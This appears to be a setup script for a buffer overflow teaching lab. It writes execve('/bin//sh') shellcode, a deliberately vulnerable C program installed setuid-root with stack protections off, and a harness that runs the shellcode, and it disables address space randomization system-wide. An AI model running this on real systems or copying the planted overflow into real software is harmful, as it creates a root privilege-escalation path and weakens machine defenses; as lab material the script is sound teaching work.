#!/bin/bash
sudo apt-get install gcc xxd vim -y

cat << 'EOF' > shellcode
31 c0 50 68 2f 2f 73 68
68 2f 62 69 6e 89 e3 50
53 89 e1 99 b0 0b cd 80
EOF

cat << 'EOF' > stack.c
/* stack.c */

/* This program has a buffer overflow vulnerability. */
/* Our task is to exploit this vulnerability */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bof(char *str)
{
    char buffer[24];

    /* The following statement has a buffer overflow problem */
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);

    printf("Returned Properly\n");
    return 1;
}

EOF

cat << 'EOF' > test.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char b[1024];
    FILE *f;

    f = fopen("badfile", "r");
    fread(b, sizeof(char), 1024, f);
    fclose(f);

    ((void(*)())b)();
}

EOF

cat << 'EOF' > compile.sh
#!/bin/bash

gcc -g -z execstack -fno-stack-protector stack.c -o stack
cp stack stack-root
sudo chown root stack-root
sudo chmod 4755 stack-root

EOF

chmod u+x compile.sh

./compile.sh


sudo sysctl -w kernel.randomize_va_space=0
xxd -p -r shellcode > badfile
./compile.sh
gcc -z execstack -fno-stack-protector test.c -o test
./test
